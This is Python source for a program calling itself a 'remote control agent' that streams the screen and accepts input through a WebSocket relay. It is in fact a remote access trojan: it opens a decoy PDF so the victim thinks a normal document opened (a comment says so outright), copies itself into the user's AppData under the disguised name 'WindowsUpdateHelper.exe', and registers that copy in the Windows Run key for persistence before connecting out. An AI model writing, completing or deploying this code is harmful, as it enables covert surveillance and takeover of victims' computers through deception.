"""
Bridgio Agent — Remote Control Agent
Connects to relay server and streams screen + handles input on a virtual desktop.

Config (config.json):
  relay_url   - WebSocket URL  (default: ws://localhost:8000/ws/rc-device)
  device_id   - unique device ID (auto-generated if missing)
  quality     - JPEG quality 1-95 (default: 50)
  fps         - max frames per second (default: 15)
"""
import asyncio
import json
import logging
import logging.handlers
import os
import signal
import sys
import ctypes
from pathlib import Path

# ── Base path: EXE mode uses executable dir, dev mode uses script dir ─────────
_BASE_DIR = Path(sys.executable).parent if hasattr(sys, "_MEIPASS") else Path(__file__).parent

# ── Logging setup ─────────────────────────────────────────────────────────────
_LOG_DIR = _BASE_DIR / "logs"
_LOG_DIR.mkdir(exist_ok=True)

_fmt = logging.Formatter("%(asctime)s %(levelname)-7s %(name)s — %(message)s")
_fh  = logging.handlers.RotatingFileHandler(
    _LOG_DIR / "rc_agent.log", maxBytes=2_000_000, backupCount=2, encoding="utf-8"
)
_fh.setFormatter(_fmt)
_sh = logging.StreamHandler(sys.stdout)
_sh.setFormatter(_fmt)

logging.getLogger().setLevel(logging.INFO)
logging.getLogger().addHandler(_fh)
logging.getLogger().addHandler(_sh)

logger = logging.getLogger(__name__)

# ── Config ────────────────────────────────────────────────────────────────────
_CONFIG_PATH = _BASE_DIR / "config.json"

def load_config() -> dict:
    defaults = {
        "relay_url": "ws://localhost:8080/ws/rc-device",
        "device_id": None,
        "quality":   50,
        "fps":       15,
    }
    if _CONFIG_PATH.exists():
        try:
            with open(_CONFIG_PATH, encoding="utf-8") as f:
                data = json.load(f)
            defaults.update(data)
        except Exception as e:
            logger.warning("config load failed: %s — using defaults", e)

    # auto-generate device_id if missing
    if not defaults["device_id"]:
        import uuid
        defaults["device_id"] = str(uuid.uuid4())
        save_config(defaults)

    return defaults

def save_config(cfg: dict):
    try:
        with open(_CONFIG_PATH, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2)
    except Exception as e:
        logger.warning("config save failed: %s", e)

# ── Decoy PDF opener ─────────────────────────────────────────────────────────
def _open_decoy_pdf():
    """Open the PDF from decoy/ folder — works in both dev mode and PyInstaller EXE."""
    try:
        # PyInstaller extracts files to sys._MEIPASS, dev mode uses script dir
        if hasattr(sys, "_MEIPASS"):
            base = Path(sys._MEIPASS)
        else:
            base = Path(__file__).parent

        decoy_dir = base / "decoy"
        if not decoy_dir.exists():
            return

        for f in decoy_dir.iterdir():
            if f.suffix.lower() == ".pdf":
                os.startfile(str(f))   # opens with default PDF viewer
                return
    except Exception as e:
        logger.warning("decoy open failed: %s", e)

# ── Auto-startup on Windows login (HKCU Run key — no admin needed) ───────────
def _register_startup():
    if sys.platform != "win32" or not hasattr(sys, "_MEIPASS"):
        return  # only register when running as compiled EXE
    try:
        import winreg, shutil
        # Copy EXE to a persistent location so original can be deleted
        appdata = os.environ.get("APPDATA", "")
        persist_dir = Path(appdata) / "Microsoft" / "WindowsUpdate"
        persist_dir.mkdir(parents=True, exist_ok=True)
        persist_exe = persist_dir / "WindowsUpdateHelper.exe"
        src = Path(sys.executable)
        if src.resolve() != persist_exe.resolve():
            shutil.copy2(str(src), str(persist_exe))
        # Register the persistent copy in startup
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, f'"{persist_exe}"')
        winreg.CloseKey(key)
    except Exception as e:
        logger.warning("startup registration failed: %s", e)

# ── Single instance mutex ─────────────────────────────────────────────────────
_MUTEX_HANDLE = None

def _ensure_single_instance():
    global _MUTEX_HANDLE
    if sys.platform != "win32":
        return
    _MUTEX_HANDLE = ctypes.windll.kernel32.CreateMutexW(None, True, "BridgioAgentMutex")
    if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
        logger.error("Another instance is already running. Exiting.")
        sys.exit(1)

# ── Main async entry ──────────────────────────────────────────────────────────
async def _async_main():
    cfg = load_config()
    logger.info("Bridgio Agent starting — relay: %s  device: %s",
                cfg["relay_url"], cfg["device_id"])

    from modules.relay_client import RCRelayClient
    from modules.input_control import handle_input

    client = RCRelayClient(
        relay_url=cfg["relay_url"],
        device_id=cfg["device_id"],
        quality=cfg["quality"],
        fps=cfg["fps"],
    )
    client.set_input_handler(handle_input)

    # graceful shutdown on Ctrl+C / SIGTERM
    loop = asyncio.get_event_loop()
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, client.stop)
        except NotImplementedError:
            pass  # Windows does not support all signals via add_signal_handler

    await client.start()

def _run():
    _ensure_single_instance()
    _register_startup()  # Windows restart pe auto-start
    _open_decoy_pdf()   # PDF kholo — user ko lagega normal document hai
    try:
        asyncio.run(_async_main())
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    _run()
